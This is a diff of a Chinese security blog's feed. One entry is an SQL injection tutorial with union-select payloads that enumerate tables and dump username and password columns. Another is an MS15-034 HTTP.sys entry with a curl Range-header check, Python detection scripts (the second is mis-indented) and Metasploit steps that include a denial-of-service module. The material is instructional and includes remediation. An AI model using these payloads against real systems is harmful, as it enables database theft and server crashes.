+    <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
+<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>一段MySQL查询数据为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这一段代码的意思是，查询<code>user</code>表中<code>user_id</code>字段的值为1的所有数据</p>
+<p>其中1是我们可以改变的地方，在不做任何防御措施下，我们将其改成我们构造的语句，从而造成SQL注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39; or 1 &#x3D; 1 --+</span><br></pre></td></tr></table></figure>
+
+<p>改变之后，这段代码的意思就变成了查询<code>user</code>表中<code>user_id</code>字段的值为1或者<code>1=1</code>的所有数据</p>
+<p>由于<code>1=1</code>的结果为真，所以最后的结果就是查询<code>user</code>表中的所有数据</p>
+<p>这里我们手动填写的语句就是<code>1&#39; or 1 = 1 --+</code></p>
+<p>其中<code>1&#39;</code>闭合之前的语句，在通过<code>or 1 = 1</code>造成结果为真的判断</p>
+<p>再通过注释符号<code>--</code>注释掉代码后边可能存在的其他语句，避免查询的结果与我们预期的结果不同</p>
+<p>最后通过符号<code>+</code>来表示空格，避免注释符号<code>--</code>与之后的单引号连接导致出错，这样一段SQL注入就产生了</p>
+<p><strong>在MySQL5.0以下</strong>，没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
+<p><strong>在MySQL5.0以上</strong>，MySQL中默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
+<p><strong>information_schema数据库中三个很重要的表：</strong></p>
+<p><strong>information_schema.schemata</strong>:  该数据表存储了mysql数据库中的所有数据库的库名<br><strong>information_schema.tables</strong>：     该数据表存储了mysql数据库中的所有数据表的表名<br><strong>information_schema.columns</strong>:    该数据表存储了mysql数据库中的所有列的列名</p>
+<h3 id="SQL注入特征"><a href="#SQL注入特征" class="headerlink" title="SQL注入特征"></a>SQL注入特征</h3><p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
+<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
+<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
+<li>database()：当前数据库</li>
+<li>user()：查询数据库的用户</li>
+<li>version()：查询数据库版本</li>
+<li>system_user()：系统用户名</li>
+<li>session_user()：链接数据库的用户名</li>
+<li>current_user：当前用户名</li>
+<li>load_file()：读取本地文件</li>
+<li>@@datadir：读取数据库路径</li>
+<li>@@basedir：MySQL安装路径</li>
+<li>@@version_complie_os：查看操作系统</li>
+</ul>
+<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p>
+<ul>
+<li>数字类型的注入</li>
+<li>字符类型的注入</li>
+<li>搜索类型的注入</li>
+</ul>
+<p><strong>依据提交方式分类</strong></p>
+<ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>COOKIE注入</li>
+<li>HTTP头注入（XFF注入、UA注入、REFERER注入）</li>
+</ul>
+<p><strong>依据获取信息的方式分类</strong></p>
+<ul>
+<li>基于布尔的盲注</li>
+<li>基于时间的盲注</li>
+<li>基于报错的盲注</li>
+<li>联合查询注入</li>
+<li>堆查询注入（可同时执行多条语句）</li>
+</ul>
+<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><table>
+<thead>
+<tr>
+<th align="center">数据库</th>
+<th align="center">指纹</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">MySQL</td>
+<td align="center">information_schema.tables</td>
+</tr>
+<tr>
+<td align="center">Access</td>
+<td align="center">msysobjects</td>
+</tr>
+<tr>
+<td align="center">SQL server</td>
+<td align="center">sysobjects</td>
+</tr>
+<tr>
+<td align="center">Oracle</td>
+<td align="center">dual</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;判断MySQL数据库</span><br><span class="line">xxx?id&#x3D;1 and exists(select * from information_schema.tables) --+</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断Access数据库 </span><br><span class="line">xxx?id&#x3D;1 and exists(select * from msysobjects) --+</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断Mssql数据库</span><br><span class="line">xxx?id&#x3D;1 and exists(select * from sysobjects) --+</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断Oracle数据库</span><br><span class="line">xxx?id&#x3D;1 and (select count(*) from dual)&gt;0 --+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Union联合查询注入"><a href="#Union联合查询注入" class="headerlink" title="Union联合查询注入"></a>Union联合查询注入</h2><h3 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h3><p>当我们找到一个注入点时，首先判断该注入点中可能存在的闭合符号</p>
+<p>无闭合，单引号<code>&#39;&#39;</code>,双引号<code>&quot;&quot;</code>,括号<code>()</code>,单引号+括号<code>(&#39;&#39;)</code>,双引号+括号<code>(&quot;&quot;)</code>….以及<code>引号+多括号</code>组合</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1</span><br><span class="line">如果报错说明可能存在注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1 and 1 &#x3D; 2 --+</span><br><span class="line">如果不报错，说明不是数字型注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1’ and 1 &#x3D; 2 --+</span><br><span class="line">如果报错，说明闭合含有单引号，如果不报错，说明闭合含有双引号</span><br><span class="line">然后通过构造语句能否成功执行判断具体的闭合组合情况</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; 1&#39; order by 5 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过语句<code>order by x</code>来判断字段的数量</p>
+<p>如果不报错，说明字段数量大于等于5，如果报错，说明字段数量小于5</p>
+<h3 id="判断数据显示位置"><a href="#判断数据显示位置" class="headerlink" title="判断数据显示位置"></a>判断数据显示位置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,2,3,4... --+ </span><br></pre></td></tr></table></figure>
+
+<p>这里先通过负号<code>-</code>或者<code>and 1 = 2</code>使得数据库报错</p>
+<p>再通过<code>union</code>建立联合查询，也就是在<code>select</code>查询里面再嵌套一个查询语句</p>
+<p>后面的数值排列取决于判断的字段数量</p>
+<p>若回显中出现了相应的数值说明我们接下来查询的信息会在该位置显示</p>
+<p>如图下的2和3可能会在网页中显现出来</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxkgro2qj60o804iabv02.jpg" alt="SQL注入1.png"></p>
+<h3 id="查询数据库库名"><a href="#查询数据库库名" class="headerlink" title="查询数据库库名"></a>查询数据库库名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><code>database()</code>是MySQL中的一个函数，表示当前数据库的名字</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxw3ux3yj60ps04ggnl02.jpg" alt="SQL注入2.png"></p>
+<h3 id="枚举数据库中的所有的表"><a href="#枚举数据库中的所有的表" class="headerlink" title="枚举数据库中的所有的表"></a>枚举数据库中的所有的表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; database() --+</span><br></pre></td></tr></table></figure>
+
+<p>这个语句的意思是从<code>information_schema</code>的<code>table-schema</code>表中查找当前数据库的所有表</p>
+<p><code>information_schema</code>：MySQL的默认数据库，包含了所有数据库，数据表的信息</p>
+<p><code>table_schema</code>：默认数据库中的一个表，记录了数据库名字</p>
+<p><code>table_name</code>：默认数据库中的一个表，记录了数据表的名字</p>
+<p><code>group_concat()</code>：是MySQL的函数，把函数中字段的值输出在一行中，以逗号分隔</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyv8akyuj60xj04qgp102.jpg" alt="SQL注入3.png"></p>
+<h3 id="枚举数据表中所有的字段"><a href="#枚举数据表中所有的字段" class="headerlink" title="枚举数据表中所有的字段"></a>枚举数据表中所有的字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema &#x3D; databese() and table_name &#x3D; &#39;user&#39; --+</span><br></pre></td></tr></table></figure>
+
+<p>这个语句的意思是从<code>information_schema</code>中条件为当前数据表并且当前数据库中的<code>user</code>表中所有字段的名字</p>
+<p><code>column_name</code>：MySQL的默认数据库中的一个表，记录了字段的名字</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyvpxte8j60xg04qq6p02.jpg" alt="SQL注入4.png"></p>
+<h3 id="查询字段中所有的值"><a href="#查询字段中所有的值" class="headerlink" title="查询字段中所有的值"></a>查询字段中所有的值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(concat_ws(0x2d,username,password)),3 from user --+</span><br></pre></td></tr></table></figure>
+
+<p>这个语句的意思是查询<code>user</code>表中<code>username</code>字段和<code>password</code>的值</p>
+<p><code>concat_ws</code>：MySQL的函数，为了格式化数据，看起来整齐，通过第一个参数连接后面所有参数</p>
+<p><code>0x2d</code>：ASCII码，代表<code>-</code></p>
+<p>最后输出格式为<code>user1-pass1</code>,<code>user2-pass2</code>…..</p>
+<h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><p>盲注，通常是在服务器没有回显错误信息，所以攻击者找到验证注入的SQL语句是否执行的方法</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>注入类漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1538,44 +1538,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
-    <url>//67bda6fdaf83.html</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
-<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
-<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器打上了补丁，那么响应状态应该是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
-<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>命令执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>jQuery库版本过低</title>
     <url>//c7d50197fdce.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -1631,6 +1593,44 @@
         <tag>跨站类漏洞</tag>
         <tag>中危漏洞</tag>
         <tag>第三方库漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
+    <url>//67bda6fdaf83.html</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
+<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
+<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器打上了补丁，那么响应状态应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
+<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>命令执行漏洞</tag>
